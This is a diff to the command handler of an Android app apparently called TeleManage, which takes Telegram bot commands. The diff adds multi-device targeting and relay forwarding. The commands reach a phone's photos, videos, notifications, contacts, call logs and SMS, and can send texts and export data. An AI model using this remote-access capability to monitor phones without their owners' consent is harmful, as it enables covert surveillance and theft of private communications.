@@ -71,7 +71,8 @@ class CommandHandler(
 
         // 2. Parse Authorized Command
         val commandParts = text.split("\\s+".toRegex())
-        val rawCommand = commandParts[0].lowercase().removeSuffix("@${preferenceManager.botConfigFlow.value.botUsername.lowercase()}")
+        val firstToken = commandParts[0].removeSuffix("@${preferenceManager.botConfigFlow.value.botUsername.lowercase()}")
+        val rawCommand = (if (firstToken.startsWith("/")) firstToken else "/$firstToken").lowercase()
 
         // Multi-device targeted command handling: /cmd <deviceId> <command>
         var effectiveRaw = rawCommand
@@ -79,20 +80,35 @@ class CommandHandler(
         if (rawCommand == "/cmd") {
             val targetId = commandParts.getOrNull(1)?.lowercase() ?: ""
             val myId = preferenceManager.getDeviceId().lowercase()
-            if (targetId.isNotEmpty() && targetId != "all" && targetId != myId) {
-                // Command is targeted at a different phone, ignore silently
-                return@withContext
-            }
-            val subCmd = commandParts.getOrNull(2)?.lowercase() ?: ""
+            val subCmd = commandParts.drop(2).joinToString(" ")
+
             if (subCmd.isEmpty()) {
                 telegramClient.sendMessage(
                     token = token,
                     chatId = chatId,
-                    text = "⚠️ <b>Usage:</b> <code>/cmd $myId &lt;command&gt;</code>\n\nExample: <code>/cmd $myId status</code>"
+                    text = "⚠️ <b>Usage:</b> <code>/cmd $myId &lt;command&gt;</code>\n\nExample: <code>/cmd $myId status</code>\nOr broadcast to all: <code>/cmd all status</code>"
                 )
                 return@withContext
             }
-            effectiveRaw = if (subCmd.startsWith("/")) subCmd else "/$subCmd"
+
+            val isTargetingMe = (targetId == "all" || targetId == myId || myId.startsWith(targetId))
+            val isTargetingOthers = (targetId == "all" || (!isTargetingMe && targetId.isNotEmpty()))
+
+            // If command is targeted for another phone (or broadcast to all), forward via relay so the other phone receives it
+            if (isTargetingOthers) {
+                val relayUrl = preferenceManager.getRelayUrl()
+                if (relayUrl.isNotBlank()) {
+                    telegramClient.forwardRelayCommand(relayUrl, targetId, subCmd)
+                }
+            }
+
+            if (!isTargetingMe) {
+                // Command is targeted at a different phone, forwarded to relay and skipped locally
+                return@withContext
+            }
+
+            val subCmdFirst = commandParts.getOrNull(2)?.lowercase() ?: ""
+            effectiveRaw = if (subCmdFirst.startsWith("/")) subCmdFirst else "/$subCmdFirst"
             effectiveParts = listOf(effectiveRaw) + commandParts.drop(3)
         }
 
@@ -115,62 +131,62 @@ class CommandHandler(
             effectiveRaw == "/status" -> {
                 handleStatusCommand(chatId, token, isServiceRunning, serviceStartTimeMs)
             }
-            rawCommand == "/health" -> {
+            effectiveRaw == "/health" -> {
                 handleHealthCommand(chatId, token, isServiceRunning, serviceStartTimeMs)
             }
-            rawCommand == "/restart_service" -> {
+            effectiveRaw == "/restart_service" -> {
                 handleRestartServiceCommand(chatId, token, isServiceRunning)
             }
-            rawCommand == "/battery" -> {
+            effectiveRaw == "/battery" -> {
                 handleBatteryCommand(chatId, token, isServiceRunning)
             }
-            rawCommand == "/storage" -> {
+            effectiveRaw == "/storage" -> {
                 handleStorageCommand(chatId, token, isServiceRunning)
             }
-            rawCommand == "/photos" -> {
+            effectiveRaw == "/photos" -> {
                 handlePhotosCommand(chatId, token)
             }
-            rawCommand == "/videos" -> {
+            effectiveRaw == "/videos" -> {
                 handleVideosCommand(chatId, token)
             }
-            rawCommand == "/notifications" -> {
+            effectiveRaw == "/notifications" -> {
                 handleNotificationsCommand(chatId, token)
             }
-            rawCommand.startsWith("/photo_") || rawCommand == "/photo" -> {
-                val param = if (rawCommand.startsWith("/photo_")) {
-                    rawCommand.removePrefix("/photo_")
+            effectiveRaw.startsWith("/photo_") || effectiveRaw == "/photo" -> {
+                val param = if (effectiveRaw.startsWith("/photo_")) {
+                    effectiveRaw.removePrefix("/photo_")
                 } else {
-                    commandParts.getOrNull(1) ?: ""
+                    effectiveParts.getOrNull(1) ?: ""
                 }
                 handleDownloadPhoto(chatId, token, param)
             }
-            rawCommand.startsWith("/video_") || rawCommand == "/video" -> {
-                val param = if (rawCommand.startsWith("/video_")) {
-                    rawCommand.removePrefix("/video_")
+            effectiveRaw.startsWith("/video_") || effectiveRaw == "/video" -> {
+                val param = if (effectiveRaw.startsWith("/video_")) {
+                    effectiveRaw.removePrefix("/video_")
                 } else {
-                    commandParts.getOrNull(1) ?: ""
+                    effectiveParts.getOrNull(1) ?: ""
                 }
                 handleDownloadVideo(chatId, token, param)
             }
             // Contacts commands
-            rawCommand == "/contacts" -> {
-                val page = commandParts.getOrNull(1)?.toIntOrNull() ?: 1
+            effectiveRaw == "/contacts" -> {
+                val page = effectiveParts.getOrNull(1)?.toIntOrNull() ?: 1
                 handleContactsCommand(chatId, token, page)
             }
-            rawCommand == "/contact" -> {
-                val query = commandParts.drop(1).joinToString(" ")
+            effectiveRaw == "/contact" -> {
+                val query = effectiveParts.drop(1).joinToString(" ")
                 handleContactSearchCommand(chatId, token, query)
             }
             // Calls commands
-            rawCommand == "/calls" -> {
-                handleCallsCommand(chatId, token, commandParts.drop(1))
+            effectiveRaw == "/calls" -> {
+                handleCallsCommand(chatId, token, effectiveParts.drop(1))
             }
             // SMS commands
-            rawCommand == "/sms" -> {
-                handleSmsCommand(chatId, token, commandParts.drop(1))
+            effectiveRaw == "/sms" -> {
+                handleSmsCommand(chatId, token, effectiveParts.drop(1))
             }
-            rawCommand.startsWith("/sms_thread_") -> {
-                val threadId = rawCommand.removePrefix("/sms_thread_").toLongOrNull()
+            effectiveRaw.startsWith("/sms_thread_") -> {
+                val threadId = effectiveRaw.removePrefix("/sms_thread_").toLongOrNull()
                 if (threadId != null) {
                     handleSmsThreadCommand(chatId, token, threadId, 1)
                 } else {
@@ -178,21 +194,19 @@ class CommandHandler(
                 }
             }
             // SMS Send & History commands
-            rawCommand == "/send_sms" -> {
-                val rawArgs = if (text.length > commandParts[0].length) {
-                    text.substring(commandParts[0].length).trimStart()
-                } else ""
+            effectiveRaw == "/send_sms" -> {
+                val rawArgs = effectiveParts.drop(1).joinToString(" ")
                 smsSendManager.handleSendSmsCommand(chatId, token, rawArgs)
             }
-            rawCommand == "/sent_sms" -> {
+            effectiveRaw == "/sent_sms" -> {
                 smsSendManager.handleSentSmsHistoryCommand(chatId, token)
             }
-            rawCommand == "/clear_sms_history" -> {
+            effectiveRaw == "/clear_sms_history" -> {
                 smsSendManager.handleClearHistoryPrompt(chatId, token)
             }
             // Export commands
-            rawCommand == "/export" -> {
-                val sub = commandParts.getOrNull(1)?.lowercase()
+            effectiveRaw == "/export" -> {
+                val sub = effectiveParts.getOrNull(1)?.lowercase()
                 if (sub == null) {
                     handleExportMenuCommand(chatId, token)
                 } else {
@@ -206,17 +220,17 @@ class CommandHandler(
                     }
                 }
             }
-            rawCommand == "/cancel_export" -> {
+            effectiveRaw == "/cancel_export" -> {
                 exportManager.cancelExport(chatId)
             }
-            rawCommand == "/set_bot" || rawCommand == "/config_bot" -> {
-                handleSetBotCommand(chatId, token, commandParts.drop(1))
+            effectiveRaw == "/set_bot" || effectiveRaw == "/config_bot" -> {
+                handleSetBotCommand(chatId, token, effectiveParts.drop(1))
             }
             else -> {
                 telegramClient.sendMessage(
                     token = token,
                     chatId = chatId,
-                    text = "❓ Unknown command: <code>$rawCommand</code>\nType /help to see the list of available commands."
+                    text = "❓ Unknown command: <code>$effectiveRaw</code>\nType /help to see the list of available commands."
                 )
             }
         }
@@ -390,6 +404,11 @@ class CommandHandler(
     private suspend fun handleHelpCommand(chatId: Long, token: String) {
         val help = """
             📱 <b>TeleManage Commands</b>
+
+            <b>Multi-Device Management:</b>
+            /devices - List all connected devices
+            /cmd &lt;id_or_model&gt; &lt;command&gt; - Control specific phone (e.g. <code>/cmd vivo status</code>)
+            /cmd all &lt;command&gt; - Send command to all connected phones
 
             <b>System & Diagnostics:</b>
             /status
@@ -1055,7 +1074,7 @@ class CommandHandler(
             )
 
             // STEP 4: Reconnect polling in background service
-            TelegramRemoteService.activeServiceInstance?.reconnectPolling("Credentials safely updated to $botName")
+            TelegramRemoteService.restartPollingConnection(context)
         } catch (e: Exception) {
             telegramClient.sendMessage(
                 token = currentToken,
